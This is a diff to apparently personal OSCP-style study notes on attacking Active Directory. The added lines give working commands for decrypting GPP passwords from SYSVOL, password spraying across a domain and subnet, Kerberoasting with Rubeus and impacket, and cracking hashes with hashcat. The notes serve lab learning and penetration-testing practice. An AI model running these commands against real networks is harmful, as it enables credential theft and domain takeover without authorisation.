@@ -43,6 +43,34 @@ Get-NetComputer | select operatingsystem,dnshostname
 crackmapexec smb <target> -u user -p password --shares
 ```
 
+#### Step 3.5: Domain Shares & SYSVOL
+
+```powershell
+# Enumerate all shares across the domain
+Find-DomainShare
+Find-DomainShare -CheckShareAccess    # only shares readable by current user
+
+# SYSVOL is readable by all domain users — always check it
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+```
+
+```cmd
+:: Search SYSVOL for GPP cpassword fields (old Group Policy Preferences passwords)
+findstr /S /I "cpassword" \\dc1.corp.com\sysvol\corp.com\
+```
+
+```bash
+# Decrypt on Kali
+gpp-decrypt "<cpassword_base64>"
+```
+
+Key things to look for in shares:
+- `cpassword` in any XML under SYSVOL (GPP passwords — AES key is public, decryptable)
+- Config files, scripts, `.txt` files with credentials in custom shares (docshare, Users, backup)
+- Folders named "do-not-share" — almost always misconfigured and very much shared
+
+Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
+
 #### Step 4: Service Principal Names (SPNs)
 ```powershell
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
@@ -53,12 +81,18 @@ setspn -L <user>
 
 #### Step 5: Active Sessions & Local Admin
 ```powershell
-Find-LocalAdminAccess
-Get-NetSession -ComputerName <target>
+Find-LocalAdminAccess    # sprays every machine in domain via SCM OpenServiceW — noisy, generates events
+Get-NetSession -ComputerName <target>    # blocked on Win10 1709+/Server 2019+ for non-admins by default
 
-# PsLoggedOn
-PsLoggedon.exe \\<target>
+# PsLoggedOn (requires Remote Registry service on target — enabled by default on servers, disabled on workstations)
+.\PsLoggedon.exe \\<target>
 ```
+
+> Key lesson: on modern Windows, `Get-NetSession` returns Access Denied rather than sessions. Use `-Verbose` to distinguish "no sessions" from "access denied". Use PsLoggedOn as the fallback.
+>
+> After Find-LocalAdminAccess finds a machine you have admin on: if a high-value user (e.g. Domain Admin) is logged in there (via PsLoggedOn), that machine is your credential theft target.
+>
+> **UAC token filtering gotcha**: when you RDP to a machine as a domain user who is a local admin, the session has a filtered token — direct paths like `C:\Users\Administrator\Desktop\` are access denied. Use UNC admin shares from a different machine instead: `type "\\target\c$\Users\administrator\Desktop\proof.txt"`
 
 #### Step 6: Permissions
 ```powershell
@@ -240,13 +274,22 @@ kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"
 hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
 ```
 
+**From Windows foothold — Spray-Passwords.ps1 (LDAP/ADSI — low noise):**
+```powershell
+cd C:\Tools; powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin    # -Admin includes admin accounts
+# Look for: Guessed password for user: 'pete' = 'Nexus123!'
+```
+
 **From Windows foothold — DomainPasswordSpray.ps1 (pulls user list from AD automatically):**
 ```powershell
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows — DomainPasswordSpray|AD.5]]
+> Module 23 lesson: crackmapexec -u pete spray across all subnet IPs reveals (Pwn3d!) where pete is local admin. Use `--continue-on-success` and spray a whole subnet: one valid cred might give local admin on a box the sprayer didn't expect.
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows — DomainPasswordSpray|AD.5]], [[Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]
 
 #### Step 3: AS-REP Roasting
 ```bash
@@ -262,15 +305,19 @@ hashcat -m 18200 hashes.asreproast rockyou.txt --force
 
 #### Step 4: Kerberoasting
 ```bash
-# Rubeus
-Rubeus.exe kerberoast /outfile:hashes.kerberoast
+# Rubeus (from domain-joined Windows with AD session — NOT over evil-winrm: WinRM auth is NTLM, no TGT exists)
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
 
-# impacket
-impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user
+# impacket (from Kali — preferred when evil-winrm is your only shell)
+impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user -outputfile hashes.kerberoast
 
 # Crack
-hashcat -m 13100 hashes.kerberoast rockyou.txt --force
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
+
+> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW` — `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[feedback-oscp-kerberos-clock-sync]].
+>
+> Rubeus over evil-winrm fails with "No credentials are available in the security package" — evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.
 
 #### Step 5: Pass-the-Hash
 ```bash
